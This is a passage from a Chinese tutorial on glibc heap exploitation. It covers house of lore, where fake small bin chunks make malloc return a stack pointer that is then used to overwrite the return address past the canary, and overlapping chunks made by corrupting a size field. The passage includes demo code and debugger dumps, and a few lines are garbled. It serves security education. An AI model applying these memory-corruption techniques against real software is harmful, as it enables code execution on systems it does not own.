伪造的两个 chunk ， chunk 1 的 fd 指向 victim chunk，bk 指向 chunk2 ，chunk 2 的fd 指向 chunk
1。这样就构造了一个 small bin 链。
由于上文提到的 check
    7 else
      8     {
      9       bck = victim->bk;
     10     if (__glibc_unlikely (bck->fd != victim)){
     11
     12                   errstr = "malloc(): smallbin double linked list corrupted";
     13                   goto errout;
     14                 }
     15
     16        set_inuse_bit_at_offset (victim, nb);
     17        bin->bk = bck;
     18        bck->fd = bin;
     19
     20        [ ... ]
     21
     22 */
所以伪造了 两个chunk 以及他们的 fd ，bk。
    void *p5 = malloc(1000);
在 free 掉 victim 之前，我们 malloc 了一块 size 为1000的chunk，只是为了确保在 free 时 victim chunk
不会被合并进 top chunk 里。
然后我们释放掉 victim， 并申请一块比较大的chunk，只需要大到让 malloc 在 unsorted bin 中找不到合适的就可以了，这样就会让
victim 被整理到 smallbins中。
    PwnLife> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x0
    smallbins
    0x70: 0x7ffff7dd1bb8 (main_arena+184) —▸ 0x603000 ◂— 0x7ffff7dd1bb8
    largebins
    empty
    PwnLife>
接着就是漏洞利用的一个重点，我们假设我们有机会去修改victim chunk 的 bk 指针。并让他指向我们在栈上 fake 的chunk。
    victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack
这个时候 ， victim chunk的bk指向 stack_buffer_1, fake chunk 1 的fd 指向了 victim
chunk。我们知道 small bins 是先进后出的，节点的增加发生在链表头部，而删除发生在尾部。这时整条链是这样的：
    head  bk\n");
       102   char *p4 = malloc(100);
       103   fprintf(stderr, "p4 = malloc(100)\n");
       104
     ► 105   fprintf(stderr, "\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n",
然后我们可以完成攻击
    108   fprintf(stderr, "\np4 is %p and should be on the stack!\n", p4); // this chunk will be allocated on stack
     ► 109   intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
       110   memcpy((p4+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
P4 + 40 的位置刚好是 eip的的位置。
最后，我们说的是small bin 链的构造，其实我这里用的是 fastbin ，其释放后虽然是被加入到 fast bins 中，而small
bin是释放后 放入 unsorted bin，但 malloc 之后，也会被整理到 small bins 里。
### 0x09 overlapping_chunks
简单的堆重叠，通过修改 size，吞并邻块，然后再下次
malloc的时候，把邻块给一起分配出来。这个时候就有了两个指针可以操作邻块。一个新块指针，一个旧块指针。
    22   p1 = malloc(0x100 - 8);
       23   p2 = malloc(0x100 - 8);
       24   p3 = malloc(0x80 - 8);
首先分配，三个chunk。
    PwnLife> heap
    0x603000 PREV_INUSE {
      prev_size = 0x0,
      size = 0x101,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603100 PREV_INUSE {
      prev_size = 0x0,
      size = 0x101,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603200 FASTBIN {
      prev_size = 0x0,
      size = 0x81,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
紧接着 free 掉 chunk2
    free(p2);
这个时候 chunk 2 被分配到了 unsortedbin
    0x603100 PREV_INUSE {
      prev_size = 0x3131313131313131,
      size = 0x101,
      fd = 0x7ffff7dd1b58 ,
      bk = 0x7ffff7dd1b58 ,
      fd_nextsize = 0x3232323232323232,
      bk_nextsize = 0x3232323232323232
    }
    PwnLife> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x7ffff7dd1b58 (main_arena+88) —▸ 0x603100 ◂— 0x7ffff7dd1b58
    smallbins
    empty
    largebins
    empty
然后，假设我们这个时候可以通过堆溢出修改 chunk 2的size
    42   int evil_chunk_size = 0x181;
       43   int evil_region_size = 0x180 - 8;
       44   fprintf(stderr, "We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n",
       45        evil_chunk_size, evil_region_size);
       46
       47   *(p2-1) = evil_chunk_size; // we are overwriting the "size" field of chunk p2
    0x603000 PREV_INUSE {
      prev_size = 0x0,
      size = 0x101,
      fd = 0x3131313131313131,
      bk = 0x3131313131313131,
      fd_nextsize = 0x3131313131313131,
      bk_nextsize = 0x3131313131313131
    }
    0x603100 PREV_INUSE {
      prev_size = 0x3131313131313131,
      size = 0x181,
      fd = 0x7ffff7dd1b58 ,
      bk = 0x7ffff7dd1b58 ,
      fd_nextsize = 0x3232323232323232,
      bk_nextsize = 0x3232323232323232
    }
    0x603280 PREV_INUSE {
      prev_size = 0x3333333333333333,
      size = 0x20d81,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
这个时候，我们发现 chunk 2的size被修改后，吞并了 chunk3，如果我们这时候 malloc 一块 0x180 的chunk。即将会把
chunk2 和chunk3 一起分配出来。
    p4 = malloc(evil_region_size); //evil_region_size = 0x180-8
当我们对 p4 进行写操作的时候
    66   fprintf(stderr, "\nIf we memset(p4, '4', %d), we have:\n", evil_region_size);
       67   memset(p4, '4', evil_region_size);
       68   fprintf(stderr, "p4 = %s\n", (char *)p4);
       69   fprintf(stderr, "p3 = %s\n", (char *)p3);
顺便把 p3 也写了。
    PwnLife> x/40gx 0x603100
    0x603100:   0x3131313131313131  0x0000000000000181
    0x603110:   0x3434343434343434  0x3434343434343434
    0x603120:   0x3434343434343434  0x3434343434343434
    0x603130:   0x3434343434343434  0x3434343434343434
    0x603140:   0x3434343434343434  0x3434343434343434
    0x603150:   0x3434343434343434  0x3434343434343434
    0x603160:   0x3434343434343434  0x3434343434343434
    0x603170:   0x3434343434343434  0x3434343434343434
    0x603180:   0x3434343434343434  0x3434343434343434
    0x603190:   0x3434343434343434  0x3434343434343434
    0x6031a0:   0x3434343434343434  0x3434343434343434
    0x6031b0:   0x3434343434343434  0x3434343434343434
    0x6031c0:   0x3434343434343434  0x3434343434343434
    0x6031d0:   0x3434343434343434  0x3434343434343434
    0x6031e0:   0x3434343434343434  0x3434343434343434
    0x6031f0:   0x3434343434343434  0x3434343434343434
    0x603200:   0x3434343434343434  0x3434343434343434
    0x603210:   0x3434343434343434  0x3434343434343434
    0x603220:   0x3434343434343434  0x3434343434343434
    0x603230:   0x3434343434343434  0x3434343434343434
    PwnLife> p p3
    $13 = (intptr_t *) 0x603210
    PwnLife> x/20gx  p3
    0x603210:   0x3434343434343434  0x3434343434343434
    0x603220:   0x3434343434343434  0x3434343434343434
    0x603230:   0x3434343434343434  0x3434343434343434
    0x603240:   0x3434343434343434  0x3434343434343434
    0x603250:   0x3434343434343434  0x3434343434343434
    0x603260:   0x3434343434343434  0x3434343434343434
    0x603270:   0x3434343434343434  0x3434343434343434
    0x603280:   0x3434343434343434  0x0000000000020d81
    0x603290:   0x0000000000000000  0x0000000000000000
    0x6032a0:   0x0000000000000000  0x0000000000000000
    PwnLife>
我们也可以去修改 p3 ，修改 p4的内容。
    71   fprintf(stderr, "\nAnd if we then memset(p3, '3', 80), we have:\n");
       72   memset(p3, '3', 80);